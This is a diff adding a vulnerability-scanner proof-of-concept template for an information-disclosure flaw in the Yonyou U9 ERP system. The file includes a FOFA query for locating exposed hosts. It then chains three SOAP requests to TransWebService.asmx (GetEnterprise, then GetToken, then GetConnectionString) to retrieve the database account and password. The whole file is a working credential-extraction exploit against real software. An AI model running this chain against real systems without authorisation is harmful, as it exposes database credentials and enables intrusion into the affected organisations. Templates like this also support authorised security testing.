@@ -1,0 +1,80 @@
+id: yonyou-u9-getconnectionstring-disclosure
+
+info:
+  name: 用友u9系统接口GetConnectionString存在信息泄露漏洞
+  author: avic123
+  severity: high
+  verified: true
+  description: |
+    用友u9 GetConnectionString存在信息泄露漏洞，攻击者可通过该漏洞获取数据库连接信息包括数据库账号密码等敏感信息。
+    fofa：body="logo-u9.png"
+  tags: yonyou,u9,disclosure
+  reference:
+    - https://blog.csdn.net/LiangYueSec/article/details/140199556
+  created: 2025/03/14
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CS/Office/TransWebService.asmx
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: http://tempuri.org/GetEnterprise
+      body: |
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:GetEnterprise/>
+           </soap:Body>
+        </soap:Envelope>
+
+    expression: |
+      response.status == 200 && response.body.bcontains(b'Code')
+    output:
+      search: '"\"Code\":\"(?P<code>.*?)\"".bsubmatch(response.body)'
+      code: search["code"]
+
+  r1:
+    request:
+      method: POST
+      path: /CS/Office/TransWebService.asmx
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: http://tempuri.org/GetToken
+      body: |
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:GetToken>
+                 <!--type: string-->
+                 <tem:endId>{{code}}</tem:endId>
+              </tem:GetToken>
+           </soap:Body>
+        </soap:Envelope>
+    expression: |
+      response.status == 200 && response.body.bcontains(b'Token')
+    output:
+      search2: '"\"Token\":\"(?P<token>.*?)\"".bsubmatch(response.body)'
+      token: search2["token"]
+  r2:
+    request:
+      method: POST
+      path: /CS/Office/TransWebService.asmx
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: http://tempuri.org/GetConnectionString
+      body: |
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:GetConnectionString>
+                 <!--type: string-->
+                 <tem:token>{{token}}</tem:token>
+              </tem:GetConnectionString>
+           </soap:Body>
+        </soap:Envelope>
+    expression: |
+      response.status == 200 && response.body.bcontains(b'User Id') && response.body.bcontains(b'Password')
+
+expression: r0() && r1() && r2()
